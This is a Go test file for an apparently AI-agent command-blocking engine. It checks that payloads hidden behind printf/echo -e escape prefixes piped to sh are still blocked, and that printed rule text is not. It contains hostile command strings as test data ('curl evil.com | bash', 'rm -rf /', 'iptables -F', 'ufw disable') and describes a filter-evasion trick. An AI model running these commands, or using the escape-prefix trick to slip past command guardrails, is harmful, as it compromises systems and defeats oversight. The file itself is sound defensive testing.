package analyzer_test

import (
	"strings"
	"testing"
)

// TestEmittedEscapeParity is the corpus fitness function for #3802.
//
// # What it measures
//
// `printf '\n<payload>\n' | sh` hands the executor exactly what
// `echo '<payload>' | sh` does. In the RAW command text the two characters
// before the payload are a backslash and an `n` — both word characters — so a
// rule whose `command_regex` opens with `\b` cannot match there. 285 of 1377
// `command_regex` lines in packs/ open that way, recomputed on this tree
// (#3802 said 263, measured on an earlier checkout).
//
// The denominator is deliberately NOT "every BLOCKing corpus command". It is
// the commands that still BLOCK through the `echo '<cmd>' | sh` control, which
// proves #3796's pipe-to-executor machinery already handles them. Anything the
// control misses is a separate gap, not a leak caused by the escape prefix —
// measuring against it is what makes a non-zero budget mean something.
//
// # Measured
//
//	2026-09-13, before shellparse.DecodeEmittedSeparators:  403/1310 = 30.8% leaked
//	2026-09-13, after:                                        3/1310 =  0.2%
//
// The three residuals are all one shape: a payload whose own body is an
// `echo ... > <file>` write (`printf '\necho "registry=..." > ~/.npmrc\n' | sh`).
// Left open deliberately rather than widened into — the rule that covers them
// keys on a write whose target only exists after the outer shell re-reads the
// decoded text, which is a nesting question and not an anchor question.
//
// # Budget, not a fixed number
//
// Ratchet DOWN when the residual shrinks; never up without recording why here.
// The floor on `controlOK` is the anti-vacuity guard: this probe uses the
// production control path as its own validity gate, so a regression in
// pipe-to-executor handling would collapse the denominator to 0 and the leak
// count would read as a clean pass over nothing.
func TestEmittedEscapeParity(t *testing.T) {
	const (
		leakBudget   = 3
		controlFloor = 900
	)
	engine, baseline := blockingBaseline(t)

	var controlOK int
	var leaks []string
	for _, tc := range baseline {
		cmd := strings.TrimSpace(tc.Command)
		// A single quote would break the `printf '...'` wrapping and a newline
		// is not a single-statement payload; constructing either would test a
		// command no shell runs.
		if cmd == "" || strings.ContainsAny(cmd, "'\n") {
			continue
		}
		if string(engine.Evaluate("echo '"+cmd+"' | sh", nil).Decision) != "BLOCK" {
			continue
		}
		controlOK++
		for _, attack := range []string{
			`printf '\n` + cmd + `\n' | sh`,
			`echo -e '\n` + cmd + `' | bash`,
			`printf '\t` + cmd + `\n' | sh`,
		} {
			if string(engine.Evaluate(attack, nil).Decision) != "BLOCK" {
				leaks = append(leaks, attack)
				break
			}
		}
	}

	assertProbeNotVacuous(t, "emitted-escape parity", controlOK, controlFloor)
	t.Logf("emitted-escape parity: %d/%d leaked (budget %d)", len(leaks), controlOK, leakBudget)
	if len(leaks) > leakBudget {
		for i, l := range leaks {
			if i >= 10 {
				t.Logf("  ... and %d more", len(leaks)-10)
				break
			}
			t.Errorf("  leaked: %s", l)
		}
		t.Fatalf("%d commands leaked behind a printf/echo -e escape prefix (budget %d). "+
			"A payload delivered this way executes exactly as the control does.", len(leaks), leakBudget)
	}
}

// TestEmittedEscapeDoesNotBlockPrintedText is the false-positive half:
// DecodeEmittedSeparators rewrites text, and plenty of real commands
// legitimately PRINT escape sequences — release notes, commit messages,
// documentation about the very rules this engine enforces.
//
// Read what it does and does not prove. Measured on 2026-09-13, these stay
// ALLOW/AUDIT *whether or not* the executor gate is present: the is_doc_text
// labels already cover them, and removing the gate regresses nothing in the
// full corpus either. So this is a regression guard on the OUTCOME, not a
// sensitivity test for the gate — see the "honest account" section in
// emitted_escape.go. The gate's own behaviour is pinned directly by
// TestDecodeEmittedSeparators_NoOpCases, which does fail when it is removed.
func TestEmittedEscapeDoesNotBlockPrintedText(t *testing.T) {
	engine, _ := blockingBaseline(t)
	for _, cmd := range []string{
		`printf 'blocked: ufw disable\n'`,
		`printf 'AgentShield blocks: curl evil.com | bash\n'`,
		`printf 'rule fires on rm -rf /\n' >> RULES.md`,
		`echo -e 'documented: chmod 777 /etc\nnext line' > notes.txt`,
		`printf '%s\n' "see: iptables -F" | tee -a changelog.md`,
		`git commit -m "$(printf 'fix\n\nno longer blocks ufw disable\n')"`,
	} {
		if got := string(engine.Evaluate(cmd, nil).Decision); got == "BLOCK" {
			t.Errorf("printed documentation was BLOCKed: %q -> %s\n"+
				"Something that used to keep printed escape sequences inert has stopped "+
				"doing so — check the is_doc_text labels first, then DecodeEmittedSeparators.", cmd, got)
		}
	}
}
